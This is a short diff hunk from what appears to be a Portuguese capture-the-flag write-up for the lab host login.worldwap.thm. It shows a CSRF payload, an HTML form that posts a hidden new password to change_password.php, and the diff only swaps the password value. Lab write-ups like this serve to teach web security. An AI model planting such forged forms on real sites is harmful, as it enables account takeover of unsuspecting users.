@@ -83,7 +83,7 @@ Um arquivo exploit.html foi criado com um formulário invisível que altera a se
 <html>
   <body>
     <form action="http://login.worldwap.thm/change_password.php" method="POST">
-      <input type="hidden" name="new_password" value="juh123">
+      <input type="hidden" name="new_password" value="mayara123">
       <input type="submit" value="Mudar Senha">
     </form>
     
